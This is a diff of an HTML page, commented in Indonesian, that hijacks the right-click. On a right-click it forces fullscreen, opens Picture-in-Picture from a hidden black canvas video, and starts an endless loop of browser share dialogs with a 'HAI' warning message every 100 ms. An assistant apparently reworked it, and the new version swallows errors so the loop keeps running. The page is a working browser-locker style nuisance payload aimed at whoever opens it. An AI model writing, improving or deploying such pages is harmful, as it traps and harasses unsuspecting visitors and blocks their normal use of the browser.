@@ -2,36 +2,69 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Fullscreen Eventsssssssssssss</title>
+    <title>Fullscreen & PiP Event</title>
     <style>
-        /* Membuat halaman penuh agar bisa diklik di mana saja */
         html, body {
             width: 100%;
             height: 100%;
             margin: 0;
             padding: 0;
-            background-color: #121212; /* Warna latar belakang gelap */
+            background-color: #121212;
             cursor: default;
+            overflow: hidden;
+        }
+        /* Menyembunyikan elemen video agar tidak merusak tampilan */
+        video {
+            display: none;
         }
     </style>
 </head>
 <body>
 
+<!-- Elemen video tiruan untuk memicu Picture-in-Picture -->
+<video id="pipVideo" autoplay loop muted playsinline></video>
+
 <script>
-// Mendengarkan event klik kanan (contextmenu) di mana saja pada layar
-window.addEventListener('contextmenu', function(e) {
-    // Mencegah menu klik kanan bawaan browser muncul
-    e.preventDefault(); 
+const video = document.getElementById('pipVideo');
+
+// Membuat video stream kosong (warna hitam) agar PiP bisa aktif tanpa file video asli
+const canvas = document.createElement('canvas');
+canvas.width = 640;
+canvas.height = 360;
+const ctx = canvas.getContext('2d');
+ctx.fillStyle = 'black';
+ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+// Mengalirkan gambar kanvas ke elemen video
+const stream = canvas.captureStream(30);
+video.srcObject = stream;
+
+// Mendengarkan event klik kanan di mana saja pada layar
+window.addEventListener('contextmenu', async function(e) {
+    e.preventDefault(); // Mencegah menu bawaan klik kanan
     
-    // Memicu Fullscreen
+    // 1. Memicu Fullscreen
     if (document.documentElement.requestFullscreen) {
-        document.documentElement.requestFullscreen();
+        document.documentElement.requestFullscreen().catch(err => console.log("Gagal Fullscreen:", err));
     }
 
-    // Loop interval share bawaan dari kode Anda
+    // 2. Memicu Picture-in-Picture (PiP)
+    try {
+        if (document.pictureInPictureEnabled && video.readyState >= 1) {
+            await video.requestPictureInPicture();
+        } else {
+            // Jika video belum siap, putar dulu lalu request PiP
+            await video.play();
+            await video.requestPictureInPicture();
+        }
+    } catch (err) {
+        console.log("Gagal memicu PiP:", err);
+    }
+
+    // 3. Loop interval share bawaan dari kode Anda
     setInterval(() => { 
-        navigator.share({title: '\u26A0 HAI HAI \u26A0\nHAI', text: 'HAI'}); 
-    }, 1);
+        navigator.share({title: '\u26A0 HAI HAI \u26A0\nHAI', text: 'HAI'}).catch(() => {}); 
+    }, 100);
 });
 </script>
 
